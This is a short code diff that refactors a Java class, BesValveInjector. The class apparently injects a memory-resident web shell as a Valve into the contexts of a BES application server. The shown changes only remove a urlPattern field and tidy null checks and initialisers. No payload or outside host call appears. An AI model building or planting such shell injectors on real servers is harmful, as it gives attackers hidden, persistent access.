@@ -14,11 +14,10 @@ import java.util.zip.GZIPInputStream;
 public class BesValveInjector {
 
 
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
-    private static String urlPattern;
 
     public BesValveInjector() {
         if (ok) {
@@ -30,9 +29,7 @@ public class BesValveInjector {
         } catch (Throwable throwable) {
            
         }
-        if (contexts == null || contexts.isEmpty()) {
-        
-        } else {
+        if (contexts != null) {
             for (Object context : contexts) {
                 try {
                  
@@ -47,7 +44,6 @@ public class BesValveInjector {
         ok = true;
         shellClass = null;
         shellClassName = null;
-        urlPattern = null;
        
     }
 
@@ -81,7 +77,7 @@ public class BesValveInjector {
    
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = context.getClass().getClassLoader();
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
